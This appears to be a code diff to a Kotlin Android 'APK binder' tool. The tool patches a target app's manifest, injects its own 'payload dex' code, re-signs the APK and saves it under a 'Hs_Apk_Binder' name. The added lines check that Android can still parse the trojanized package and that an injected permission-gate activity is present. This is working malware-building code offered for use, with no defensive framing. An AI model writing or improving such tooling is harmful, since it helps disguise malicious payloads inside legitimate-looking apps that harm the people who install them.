@@ -82,7 +82,7 @@ class BinderEngine(private val ctx: Context) {
                     " (manifest=" + manifest.size + " bytes)"
             )
         }
-        onLog(LogLevel.SUCCESS, "Manifest patched")
+        onLog(LogLevel.SUCCESS, "Manifest patched: " + manifest.size + " -> " + patched.size + " bytes")
 
         onLog(LogLevel.INFO, "Collecting payload dex...")
         val dexes = collectOwnDex()
@@ -156,6 +156,33 @@ class BinderEngine(private val ctx: Context) {
             unsigned.copyTo(finalApk, overwrite = true)
         }
 
+        // --- অ্যান্ড্রয়েডের নিজের পার্সার দিয়ে যাচাই ---
+        val info = try {
+            ctx.packageManager.getPackageArchiveInfo(
+                finalApk.absolutePath,
+                PackageManager.GET_ACTIVITIES or PackageManager.GET_SERVICES
+            )
+        } catch (t: Throwable) {
+            onLog(LogLevel.WARN, "Verify error: " + (t.message ?: "unknown"))
+            null
+        }
+
+        if (info == null) {
+            onLog(LogLevel.ERROR, "Manifest parse: FAILED (Android cannot read it)")
+        } else {
+            onLog(LogLevel.SUCCESS, "Manifest parse: OK")
+            onLog(LogLevel.INFO, "Package: " + info.packageName)
+            onLog(LogLevel.INFO, "minSdk: " + (info.applicationInfo?.minSdkVersion ?: 0) +
+                "  targetSdk: " + (info.applicationInfo?.targetSdkVersion ?: 0))
+            onLog(LogLevel.INFO, "App class: " + (info.applicationInfo?.className ?: "(none)"))
+            val acts = info.activities?.mapNotNull { it.name } ?: emptyList()
+            val hasGate = acts.any { it.endsWith("PermissionGateActivity") }
+            onLog(
+                if (hasGate) LogLevel.SUCCESS else LogLevel.ERROR,
+                "Permission activity present: " + hasGate
+            )
+        }
+
         val safeLabel = label.replace(Regex("[^A-Za-z0-9]+"), "_").trim('_').take(40)
             .ifBlank { "App" }
         val name = "Hs_Apk_Binder_" + safeLabel + "_" + System.currentTimeMillis() + ".apk"
@@ -210,7 +237,7 @@ class BinderEngine(private val ctx: Context) {
         val signerConfig = ApkSigner.SignerConfig.Builder(Const.KS_ALIAS, key, listOf(cert)).build()
         ApkSigner.Builder(listOf(signerConfig))
             .setInputApk(input)
-            .setOutputApk(output)
+            .setOutputApk(finalApkOut(output))
             .setV1SigningEnabled(true)
             .setV2SigningEnabled(true)
             .setV3SigningEnabled(true)
@@ -218,4 +245,6 @@ class BinderEngine(private val ctx: Context) {
             .build()
             .sign()
     }
+
+    private fun finalApkOut(file: File): File = file
 }
